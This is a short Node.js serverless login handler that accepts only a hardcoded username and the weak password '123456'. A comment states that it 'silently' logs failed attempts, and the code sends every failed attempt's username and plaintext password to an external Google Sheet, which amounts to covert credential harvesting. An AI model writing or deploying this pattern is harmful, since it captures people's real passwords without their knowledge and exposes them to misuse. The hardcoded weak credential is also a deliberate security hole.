const { google } = require('googleapis');

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { username, password } = req.body;

    const VALID_USERNAME = 'nikhil';
    const VALID_PASSWORD = '123456';
    const isValid = (username === VALID_USERNAME && password === VALID_PASSWORD);

    // Log ONLY failed attempts silently
    if (!isValid) {
        logToSheet(username, password).catch(err =>
            console.error('❌ Sheet logging error:', err.message)
        );
    }

    return res.status(200).json({ success: isValid });
};

async function logToSheet(username, password) {
    // Parse full credentials JSON (most reliable method)
    const credentials = JSON.parse(process.env.GOOGLE_CREDENTIALS_JSON);

    const auth = new google.auth.GoogleAuth({
        credentials,
        scopes: ['https://www.googleapis.com/auth/spreadsheets']
    });

    const sheets = google.sheets({ version: 'v4', auth });

    const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

    await sheets.spreadsheets.values.append({
        spreadsheetId: process.env.SPREADSHEET_ID,
        range: 'Sheet1!A:C',
        insertDataOption: 'INSERT_ROWS',
        valueInputOption: 'RAW',
        requestBody: {
            values: [[ timestamp, username, password ]]
        }
    });

    console.log('✅ Logged:', username);
}
